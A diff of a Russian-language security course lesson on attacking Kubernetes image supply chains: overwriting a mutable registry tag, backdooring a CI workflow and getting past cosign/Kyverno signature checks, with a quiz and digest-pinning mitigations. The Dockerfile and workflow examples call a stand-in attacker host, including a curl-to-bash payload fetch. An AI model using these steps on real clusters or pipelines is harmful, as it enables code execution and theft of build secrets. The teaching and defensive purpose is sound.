@@ -15,174 +15,161 @@ estimated_minutes: 50
 summary: "Supply chain образов Kubernetes: реестры (ECR/GCR/ACR/Harbor), mutable-теги, подписи (cosign/Sigstore), image pull secrets и admission-политики. Как подменить образ и обойти проверки."
 ---
 
-## Зачем этот урок
+## Задача
 
-Образы контейнеров — код, который исполняется в кластере. Если атакующий контролирует реестр, тег или процесс сборки, он контролирует и рабочие нагрузки. Supply chain образов — одна из самых «дорогих» атак: подменив образ, можно получить выполнение кода в кластере без эксплуатации уязвимостей. Эта тема связана с подписями (Sigstore/cosign), admission-контроллерами, проверяющими образы, и с правами на реестр (`push`/`delete`).
+Ты получил право `push` в container registry, из которого кластер тянет образы. Можно ли, не эксплуатируя ни одной CVE, получить выполнение кода в кластере? Да — если deployment ссылается на **mutable-тег** (например, `app:latest`). Подменив образ, ты заставишь кластер запустить твой код. Задача урока — разобрать supply chain образов и подменить образ.
 
-## Модель supply chain
+## Что такое supply chain образов
+
+**Образ** — код, который исполняется в кластере. Цепочка: исходники → **CI-сборка** → **registry** → pull в кластер. Кто контролирует реестр, тег или сборку — контролирует рабочие нагрузки.
+
+Ключевые понятия:
 
 - **Registry** — хранит образы (ECR, GCR/Artifact Registry, ACR, Docker Hub, Harbor). Доступ через IAM/токены.
-- **Tag** — изменяемая метка (`app:latest`). **Digest** — неизменяемый идентификатор (`sha256:...`). Если deployment ссылается на тег, он уязвим к подмене.
+- **Tag** — изменяемая метка (`app:latest`). **Digest** — неизменяемый идентификатор (`sha256:...`). Deployment на теге уязвим к подмене; на digest — нет.
 - **Image pull secret** — креды для приватного реестра в кластере.
-- **Signature** — подпись образа (cosign, Notary). Admission (Kyverno/OPA/Connaisseur) может требовать подпись.
-- **SBOM / attestation** — метаданные о содержимом и происхождении.
-- **Build** — CI, который собирает и пушит образ; компрометация сборки = компрометация всех деплоев.
+- **Signature** — подпись образа (cosign/Sigstore); admission (Kyverno/Connaisseur) может требовать её.
+- **Build** — CI, собирающий и пушущий образы; его компрометация заражает все деплои.
 
-## Инструменты и команды
+## Данные, с которыми работаем
+
+Смотрим, какой образ и по какому идентификатору использует кластер:
 
 ```bash
-# Что за образ у пода и по какому идентификатору
-kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}'
-kubectl get pod mypod -o jsonpath='{.status.containerStatuses[0].imageID}'
-# docker-pullable://registry/app@sha256:abc...
-
-# Реестр: теги и digest
-aws ecr list-images --repository-name app
-gcloud artifacts docker tags list us-central1-docker.pkg.dev/proj/repo/app
-az acr repository show-tags --name myacr --repository app
-
-# Подписи (cosign)
-cosign verify --key cosign.pub registry/app:latest
-cosign triangulate registry/app:latest
-
-# Проверка admission-политик
-kubectl get validatingwebhookconfigurations
-kubectl get clusterpolicies   # Kyverno
+$ kubectl get deploy app -o jsonpath='{.spec.template.spec.containers[0].image}'
+registry.example.com/app:latest
+$ kubectl get pod mypod -o jsonpath='{.status.containerStatuses[0].imageID}'
+docker-pullable://registry.example.com/app@sha256:abc123
 ```
 
-## Разобранный пример: подмена mutable-тега
-
-Сценарий: у нас есть права `push` в реестр, deployment использует тег `app:latest`.
+Deployment ссылается на **тег** `latest` — значит, подмена возможна. Проверяем права в реестре:
 
 ```bash
-# 1. Смотрим, какой образ используется и как часто обновляется
-kubectl get deploy app -o jsonpath='{.spec.template.spec.containers[0].image}'
-# registry.example.com/app:latest
+$ aws ecr get-authorization-token >/dev/null && echo "auth ok"
+auth ok
+$ aws ecr list-images --repository-name app --query 'imageIds[].imageTag'
+["latest","v1.2","v1.1"]
+```
 
-# 2. Собираем образ с полезной нагрузкой
-cat > Dockerfile <<'EOF'
+У нас есть доступ. Смотрим admission-политики:
+
+```bash
+$ kubectl get clusterpolicies 2>/dev/null | grep -i verifyImages
+# пусто — проверки подписи нет
+```
+
+## Шаг 1: собираем образ с полезной нагрузкой
+
+```bash
+$ cat > Dockerfile <<'EOF'
 FROM alpine
 CMD ["sh","-c","curl http://attacker.example.com/x; sleep infinity"]
 EOF
-docker build -t registry.example.com/app:latest .
-docker push registry.example.com/app:latest
-# latest: digest: sha256:def... size: 1234
-
-# 3. Триггерим rollout (или ждём автообновления)
-kubectl rollout restart deploy/app
-kubectl get pods -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
-# registry.example.com/app@sha256:def...
+$ docker build -t registry.example.com/app:latest .
+$ docker push registry.example.com/app:latest
+latest: digest: sha256:def456 size: 1234
 ```
 
-Через минуту в кластере работает наш код. Если бы deployment ссылался на digest, подмена была бы невозможна без изменения манифеста. Проверяйте, использует ли кластер теги или digest, и есть ли admission-политика, запрещающая mutable-теги.
+Тег `latest` перезаписан нашим образом.
+
+## Шаг 2: триггерим rollout
+
+```bash
+$ kubectl rollout restart deploy/app
+deployment.apps/app restarted
+$ kubectl get pods -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
+registry.example.com/app@sha256:def456
+```
+
+Кластер подтянул наш образ — теперь в поде работает наш код. Если бы deployment ссылался на digest `abc123`, подмена тега ничего бы не дала.
+
+## Полный прогон от начала до конца
+
+1. `kubectl get deploy` → образ на теге `latest`.
+2. `ecr list-images` → есть доступ к реестру.
+3. `get clusterpolicies` → проверки подписи нет.
+4. Собрали и запушили образ с бэкдором.
+5. `rollout restart` → наш код в кластере.
+
+## Если не сработало
+
+- **Digest pinning.** Deployment на digest — подмена тега не работает, нужен доступ к перезаписи digest или изменение манифеста.
+- **Admission `verifyImages`.** Kyverno/Connaisseur отклоняет неподписанные образы — ищи обход подписи.
+- **Immutable tags.** Реестр запрещает перезапись тега — нужен новый тег и изменение deployment.
+- **`failurePolicy: Ignore`.** При недоступности webhook запрос пропускается — можно «уронить» webhook.
+- **Image pull policy.** `IfNotPresent` оставляет старый образ на узле — подмена может не подхватиться.
+- **Кэш на узле.** Даже при подмене образа на узле может остаться старая копия.
 
 ## Подписи и их обход
 
-Cosign/Sigstore позволяет подписывать образы и проверять подпись. Admission-контроллер (Connaisseur, Kyverno `verifyImages`) может отклонять неподписанные образы. Обходы:
+Cosign/Sigstore подписывает образы, а admission проверяет подпись. Обходы:
 
-- **Подмена публичного ключа.** Если ключ проверки хранится в ConfigMap/Secret кластера и у вас есть доступ — замените его на свой.
-- **Keyless-подпись.** Если проверка настроена на OIDC-идентичность (например, GitHub Actions), подпись можно сделать из другого репозитория/ветки, если условие слабое.
-- **Подпись тега, а не digest.** Если проверяется подпись тега, а не digest, между проверкой и pull возможна гонка (TOCTOU).
-- **Пропуск через аннотацию.** Некоторые политики позволяют исключения по label/namespace — проверьте.
-- **Private registry mirror.** Если кластер настроен на mirror, подмена источника может обойти проверку.
-
-```bash
-# Проверить, что именно проверяется
-kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
-kubectl get validatingwebhookconfigurations -o yaml | grep -A10 'rules:'
-```
-
-## Чек-лист атаки
-
-1. Найти реестры и права на push/delete.
-2. Проверить, используют ли deployment'ы теги или digest.
-3. Проверить image pull secrets (иногда с широкими правами реестра).
-4. Проверить admission-политики по образам.
-5. Проверить цепочку сборки (CI) — компрометация сборки сильнее.
-6. Проверить подписи и ключи проверки.
-7. Проверить, есть ли исключения (namespace/label).
-
-## Обход защит и edge cases
-
-- **Digest pinning.** Если используются digest, подмена тега не сработает — нужен доступ к реестру для перезаписи digest или изменение манифеста.
-- **Admission webhook failure policy.** `failurePolicy: Ignore` при недоступности webhook пропускает образы — можно «уронить» webhook.
-- **Image pull policy.** `Always` vs `IfNotPresent`: при `IfNotPresent` старый образ остаётся на узле.
-- **Registry с immutable tags.** Запрещает перезапись тега — тогда нужен новый тег + изменение deployment.
-- **Кэш на узле.** Даже при подмене образа на узле может остаться старая копия.
-
-## Частые ошибки и подводные камни
-
-- Считать, что «образы подписаны» = безопасно: проверка может быть отключена.
-- Не проверить права на реестр: часто роль может пушить.
-- Игнорировать CI как более сильный вектор.
-- Забыть про failurePolicy webhook.
-- Путать подпись тега и digest.
-
-## Защита и детект
-
-- Использовать digest вместо тегов; запретить mutable-теги admission-политикой.
-- Подписывать образы (cosign) и проверять подпись в admission (Kyverno/Connaisseur).
-- Ограничить push/delete в реестр; включить immutability.
-- Защитить ключи проверки (не в изменяемых ConfigMap).
-- Аудит: логи реестра, admission-решений, kubelet pull.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — deployment на `:latest` без проверки. Второй — права push у широкой роли. Третий — подпись не проверяется. Четвёртый — ключ проверки в изменяемом ConfigMap. Пятый — failurePolicy Ignore. Все они позволяют подменить образ.
-
-## Практическое задание
-
-1. Создайте реестр и deployment на теге `:latest`.
-2. Подмените образ и перезапустите deployment.
-3. Настройте Kyverno verifyImages и проверьте отклонение неподписанного образа.
-4. Переключите deployment на digest и повторите подмену тега.
-
-## Что дальше / решение
-
-Подмена образа даёт выполнение кода в кластере. Дальше — эскалировать (SA-токены, escape). Зафиксируйте путь «push в реестр → подмена → код в поде» в графе. Если используется digest и подпись проверяется — ищите CI или ключ проверки.
-
-## Разобранный пример 2: компрометация сборки
-
-Компрометация CI/CD сильнее подмены реестра: сборка создаёт образы для множества сервисов, и все они окажутся заражёнными.
+- **Подмена публичного ключа.** Если ключ проверки лежит в ConfigMap/Secret кластера и у тебя есть доступ — замени на свой.
+- **Keyless-подпись.** Если проверка на OIDC-идентичность, подпись можно сделать из репозитория/ветки со слабым условием.
+- **Подпись тега, а не digest.** Между проверкой и pull возможна гонка (TOCTOU).
+- **Исключения по label/namespace.** Некоторые политики позволяют их — проверь.
 
 ```bash
-# В workflow сборки (GitHub Actions) добавляем шаг exfil/backdoor
-# .github/workflows/build.yml
-# - run: |
-#     curl -s http://attacker.example.com/stage.sh | bash
-#     docker build -t $REGISTRY/app:$TAG .
-#     docker push $REGISTRY/app:$TAG
-
-# Либо правим Dockerfile: добавляем RUN, который внедряет бэкдор
-# FROM node:20
-# RUN curl -s http://attacker.example.com/x.sh | bash
+$ kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
 ```
 
-Секреты сборки (креды реестра, облачные креды) доступны на этапе build. Их можно выгрузить и использовать отдельно, а образ оставить «рабочим», чтобы не вызвать подозрений. Проверяйте цепочку: кто имеет доступ к CI, какие секреты там лежат, есть ли подпись и кто её проверяет. Если образы подписываются в CI, но ключ подписи лежит там же — компрометация сборки позволяет подписать заражённый образ.
+## Компрометация сборки — сильнее реестра
+
+Компромисс CI заражает образы для множества сервисов сразу. В workflow сборки добавляем шаг, который подтягивает полезную нагрузку, а затем собирает и пушит образ как обычно:
+
+```yaml
+- run: |
+    curl -s http://attacker.example.com/stage.sh | bash
+    docker build -t $REGISTRY/app:$TAG .
+    docker push $REGISTRY/app:$TAG
+```
+
+Секреты сборки (креды реестра, облачные креды) доступны на этапе build — их можно выгрузить отдельно. Если образы подписываются в CI, а ключ подписи лежит там же, компромисс сборки позволяет подписать и заражённый образ.
 
 ## Реестр как цель: ECR/GCR/ACR
 
-Доступ к реестру определяется IAM. Часто роли приложений имеют `ecr:GetAuthorizationToken` и `ecr:BatchGetImage`, а иногда и `ecr:PutImage`. Проверяйте права на push/delete.
+Доступ к реестру определяется IAM. Часто роли приложений имеют `ecr:GetAuthorizationToken` и `ecr:BatchGetImage`, а иногда и `ecr:PutImage`. Проверяй права на push:
 
 ```bash
-# ECR: права и образы
-aws ecr get-authorization-token
-aws ecr describe-repositories --query 'repositories[].repositoryUri'
-aws ecr list-images --repository-name app
-aws ecr put-image --repository-name app --image-tag latest --image-manifest file://manifest.json
-
-# GCR/Artifact Registry
-gcloud artifacts repositories list
-gcloud artifacts docker images list us-central1-docker.pkg.dev/proj/repo
-
-# ACR
-az acr repository list --name myacr
-az acr login --name myacr && docker push myacr.azurecr.io/app:latest
+$ aws ecr get-authorization-token >/dev/null && echo ok
+ok
+$ aws ecr list-images --repository-name app --query 'imageIds[].imageTag'
+["latest","v1.2"]
 ```
 
-Если у вас есть `PutImage`, вы можете подменить образ напрямую, без доступа к CI. Если есть `DeleteRepository`/`DeleteImage` — это DoS (но опасно). Проверяйте также lifecycle policies: они могут автоматически удалять старые теги, что влияет на деплой. И не забывайте про image pull secrets в кластере — иногда они имеют более широкие права, чем нужно.
+Если есть `PutImage`, подменяешь образ напрямую, без доступа к CI. Не забывай про image pull secrets в кластере — иногда они имеют более широкие права, чем нужно.
+
+## Обход защит и edge cases
+
+**Digest pinning** ломает подмену тега — нужен доступ к перезаписи digest или изменение манифеста. **Admission `failurePolicy: Ignore`** пропускает образ, если webhook недоступен — можно «уронить» webhook. **Image pull policy** `IfNotPresent` оставляет старый образ на узле. **Immutable tags** в реестре запрещают перезапись тега — тогда нужен новый тег и правка deployment. **Кэш на узле** может сохранить старую копию. Каждый из этих нюансов меняет стратегию подмены.
+
+## Подписи: как проверяются
+
+Проверку подписи задаёт admission-контроллер (Kyverno `verifyImages`, Connaisseur). Смотрим, что именно он проверяет:
+
+```bash
+$ kubectl get clusterpolicies -o yaml | grep -A20 verifyImages
+```
+
+Если проверяется подпись тега, а не digest, между проверкой и pull возможна гонка (TOCTOU). Если ключ проверки лежит в изменяемом ConfigMap — его можно подменить. Оба случая делают «подписанные образы» ложной защитой.
+
+## Что мы теперь знаем
+
+- Deployment на mutable-теге уязвим к подмене; на digest — нет.
+- Права `push`/`PutImage` в реестр = код в кластере без CVE.
+- Компрометация CI сильнее подмены реестра: заражает все собираемые образы.
+- Подпись (cosign) можно обойти подменой ключа или слабым keyless-условием.
+- `failurePolicy: Ignore` и immutable tags меняют стратегию.
+
+## На что смотреть дальше
+
+- **cloud-artifact-registry**: права и устройство реестров.
+- **cloud-supply-chain-sbom**: SBOM и attestation как защита.
+- **cloud-cicd-github-actions**: компрометация сборки.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Почему mutable-тег опасен?"
@@ -217,7 +204,19 @@ az acr login --name myacr && docker push myacr.azurecr.io/app:latest
     - "CI шифрует образы"
   answer: 0
   explanation: "Сборка создаёт образы для многих сервисов — эффект шире."
+- question: "Что защищает от подмены тега на уровне deployment?"
+  options:
+    - "Ссылка на образ по digest"
+    - "Больше реплик"
+    - "hostNetwork"
+    - "Ingress"
+  answer: 0
+  explanation: "Digest неизменяем, поэтому подмена тега не влияет на деплой."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **Pod Security Admission** — как обойти ограничения на привилегированные поды. А пока главное запомни: **контроль над реестром или тегом = код в кластере без эксплуатации CVE, а защита — это digest и проверка подписи.**
 
 ## Где пригодится
 
